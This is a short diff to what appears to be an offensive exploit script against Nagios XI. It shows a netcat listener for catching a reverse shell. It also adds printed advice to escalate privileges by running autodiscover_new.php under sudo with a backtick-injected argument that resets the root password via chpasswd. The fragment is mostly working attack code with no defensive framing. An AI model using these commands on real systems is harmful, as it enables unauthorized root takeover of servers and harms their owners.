@@ -31,7 +31,8 @@ def serverShutdown(server):
     server.stop()
     print("[+] Shutting down Web-Server![+]")
     print("[*] Getting Shell, wait a moment!![*]")
-
+    print("[*] Check sudo -l for presence of autodiscover_new.php, if present, privesc!")
+    print("[*] Possible Privesc: sudo php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses='127.0.0.1/1`echo root:pass|chpasswd`'")
 def getshell(lport):
     print("[*] Ooh boy, here it comes the Shell! [*]\r\n")
     netcat_thread = threading.Thread(subprocess.run('nc -nlvp ' + lport, shell=True))
